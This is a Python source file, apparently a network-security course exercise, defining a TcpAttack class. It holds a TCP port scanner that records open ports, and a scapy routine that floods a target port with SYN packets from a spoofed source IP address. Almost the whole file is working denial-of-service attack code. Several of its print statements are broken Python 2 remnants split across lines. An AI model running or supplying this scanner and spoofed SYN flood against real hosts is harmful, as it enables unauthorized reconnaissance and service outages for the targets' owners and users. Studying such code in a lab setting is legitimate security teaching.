#!/usr/bin/env/python3
from BitVector import *
import sys, socket
import re
import os.path
from scapy.all import *

class TcpAttack:
    def __init__(self, spoofip, targetip):
        self.spoofIP = spoofip
        self.targetIP = targetip

    def __scanTarget__(self, rangeStart, rangeEnd):
        verbosity = 0;  # set it to 1 if you want to see the result for each   #(1)
        # port separately as the scan is taking place

        dst_host = self.targetIP  # (2
        start_port = rangeStart  # (3)
        end_port = rangeEnd  # (4)

        open_ports = []  # (5)
        # Scan the ports in the specified range:
        for testport in range(start_port, end_port + 1):  # (6)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # (7)
            sock.settimeout(0.1)  # (8)
            try:  # (9)
                sock.connect((dst_host, testport))  # (10)
                open_ports.append(testport)  # (11)
                if verbosity: print
                testport  # (12)
                sys.stdout.write("%s" % testport)  # (13)
                sys.stdout.flush()  # (14)
            except:  # (15)
                if verbosity: print
                "Port closed: ", testport  # (16)
                sys.stdout.write(".")  # (17)
                sys.stdout.flush()  # (18)

        # Now scan through the /etc/services file, if available, so that we can
        # find out what services are provided by the open ports.  The goal here
        # is to construct a dict whose keys are the port names and the values
        # the corresponding lines from the file that are "cleaned up" for
        # getting rid of unwanted white space:
        service_ports = {}
        if os.path.exists("/etc/services"):  # (19)
            IN = open("/etc/services")  # (20)
            for line in IN:  # (21)
                line = line.strip()  # (22)
                if line == '': continue  # (23)
                if (re.match(r'^\s*#', line)): continue  # (24)
                entries = re.split(r'\s+', line)  # (25)
                service_ports[entries[1]] = ' '.join(re.split(r'\s+', line))  # (26)
            IN.close()  # (27)

        OUT = open("openports.txt", 'w')  # (28)
        if not open_ports:  # (29)
            print
            "\n\nNo open ports in the range specified\n"  # (30)
        else:
            print
            "\n\nThe open ports:\n\n";  # (31)
            for k in range(0, len(open_ports)):  # (32)
                if len(service_ports) > 0:  # (33)
                    for portname in sorted(service_ports):  # (34)
                        pattern = r'^' + str(open_ports[k]) + r'/'  # (35)
                        if re.search(pattern, str(portname)):  # (36)
                            print
                            "%d:    %s" % (open_ports[k], service_ports[portname])
                            # (37)
                else:
                    print
                    open_ports[k]  # (38)
                OUT.write("%s\n" % open_ports[k])  # (39)
        OUT.close()  # (40)

    def __attackTarget__(self,port, numSyn):
        f = open('openports.txt', 'r')
        ports = f.read()
        if port not in ports:
            return 0
        srcIP = self.spoofIP
        destIP = self.targetIP
        destPort = port
        count = numSyn

        for i in range(count):  # (5)
            IP_header = IP(src=srcIP, dst=destIP)  # (6)
            TCP_header = TCP(flags="S", sport=RandShort(), dport=destPort)  # (7)
            packet = IP_header / TCP_header  # (8)
            try:  # (9)
                send(packet)  # (10)
            except Exception as e:  # (11)
                print
                e  # (11)
        return 1


